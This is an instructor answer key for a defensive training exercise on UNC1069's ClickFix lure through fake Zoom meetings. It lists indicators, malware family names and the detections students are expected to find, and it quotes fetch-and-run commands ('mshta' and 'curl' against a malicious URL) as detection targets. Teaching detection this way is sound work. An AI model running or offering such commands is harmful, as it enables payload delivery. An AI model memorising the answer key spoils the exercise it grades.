# Instructor answer key

## Core story

UNC1069 uses a compromised Telegram account and fake Zoom infrastructure to lure cryptocurrency-sector users. The fake meeting drives a ClickFix troubleshooting flow. The malicious command fetches `http://mylingocoin.com/audio/fix/6454694440` and leads to multi-family malware deployment.

## Must-find indicators

- `zoom.uswe05.us`
- `mylingocoin.com`
- `http://mylingocoin.com/audio/fix/6454694440`
- `6454694440`
- `UNC1069`
- `WAVESHAPER, SUGARLOADER, HYPERCALL, HIDDENCALL, SILENCELIFT, DEEPBREATH, CHROMEPUSH`

## Expected high-signal detections

- Telegram/social event pointing to `zoom.uswe05.us`
- DNS/proxy events for `mylingocoin.com`
- Endpoint command line containing `curl -A audio` or `mshta http://mylingocoin.com/audio/fix/6454694440`
- Malware telemetry with listed malware family names
- Credential or session-token target fields populated after ClickFix execution

## Discussion prompts

- Which detections are IOC-only and likely brittle?
- Which detections generalize to future ClickFix campaigns?
- How should analysts document reported AI/deepfake use when endpoint evidence does not prove the video generation method?
